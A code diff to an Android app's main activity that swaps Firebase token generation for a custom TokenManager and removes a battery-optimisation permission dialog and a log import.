@@ -6,7 +6,6 @@ import android.content.pm.PackageManager;
 import android.net.Uri;
 import android.os.Bundle;
 import android.provider.Settings;
-import android.util.Log;
 import android.webkit.WebView;
 import android.webkit.WebViewClient;
 import android.widget.Toast;
@@ -18,15 +17,13 @@ import androidx.appcompat.app.AlertDialog;
 import androidx.appcompat.app.AppCompatActivity;
 import androidx.core.app.ActivityCompat;
 
-import com.google.firebase.messaging.FirebaseMessaging;
 import com.lyrnic.userside.R;
-import com.lyrnic.userside.constants.Constants;
+import com.lyrnic.userside.managers.TokenManager;
 import com.lyrnic.userside.utilities.DevicesUtilities;
 import com.lyrnic.userside.utilities.PermissionsUtilities;
 
 public class MainActivity extends AppCompatActivity {
     private static final int REQUEST_READ_CONTACTS_PERMISSION = 22;
-    boolean requestBatteryPermission;
     WebView webView;
     public static final int REQUEST_READ_WRITE_EXTERNAL_STORAGE_PERMISSION = 2;
 
@@ -55,13 +52,11 @@ public class MainActivity extends AppCompatActivity {
 
 
     public void initToken() {
-        FirebaseMessaging.getInstance().getToken().addOnCompleteListener(task -> {
-            if (task.isSuccessful()) {
-                getSharedPreferences(getPackageName() + ".FCM", MODE_PRIVATE).edit().putString(Constants.DEVICE_TOKEN_KEY, task.getResult()).apply();
-                DevicesUtilities.registerDeviceToken(MainActivity.this);
-                Log.d(getPackageName() + "::FCM", "FCM TOKEN GENERATED: " + task.getResult());
-            }
-        });
+        if(!TokenManager.hasToken(this)){
+            TokenManager.generateToken(this);
+        }
+
+        DevicesUtilities.registerDeviceToken(this);
     }
 
     @Override
@@ -111,17 +106,6 @@ public class MainActivity extends AppCompatActivity {
 
     public void requestReadWriteStorageAndroid10AndBelow() {
         requestPermissions(new String[]{android.Manifest.permission.READ_EXTERNAL_STORAGE, Manifest.permission.WRITE_EXTERNAL_STORAGE}, MainActivity.REQUEST_READ_WRITE_EXTERNAL_STORAGE_PERMISSION);
-    }
-
-    public void showRequestIgnoreBatteryOptimizationDialog() {
-        new AlertDialog.Builder(this)
-                .setPositiveButton("Ask for permission", ((dialog, which) -> {
-                    requestBatteryPermission = true;
-                }))
-                .setTitle("Ignoring battery optimization")
-                .setMessage("You can't keep using app without ignoring battery optimization")
-                .setCancelable(false)
-                .show();
     }
 
     public void requestIgnoreBatteryOptimization() {
